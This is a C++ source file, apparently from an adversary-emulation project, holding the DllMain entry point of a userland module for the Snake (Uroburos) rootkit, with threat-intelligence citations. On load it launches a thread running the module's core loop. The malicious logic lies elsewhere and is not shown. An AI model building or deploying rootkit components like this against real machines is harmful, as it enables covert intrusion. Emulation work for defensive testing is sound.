/*
 * Userland Module DLL for Snake Rootkit.
 * 
 * CTI references:
 * [1] https://artemonsecurity.com/snake_whitepaper.pdf
 * [2] https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf
 */

#include <windows.h>
#include "core.h"
#include "api_wrappers.h"

// https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    // silence warnings about unused parameters
    (void)hinstDLL;

    ApiWrapper api_wrapper;

    switch(fdwReason) { 
        case DLL_PROCESS_ATTACH:
            // Will be triggered on LoadLibrary. Kick off main thread and return
            api_wrapper.CreateThreadWrapper(
                NULL, // default security descriptor
                0, // default stack size
                module_core::CoreLoop, // function to run
                NULL, // arg for thread function
                0, // run immediately
                NULL // don't return thread identifier
            );
            break;

        case DLL_THREAD_ATTACH:
            // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
             // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
        
            if (lpvReserved != nullptr)
            {
                break; // do not do cleanup if process termination scenario
            }
            
            // Perform any necessary cleanup.
            break;
    }
    return TRUE; // Successful DLL_PROCESS_ATTACH.
}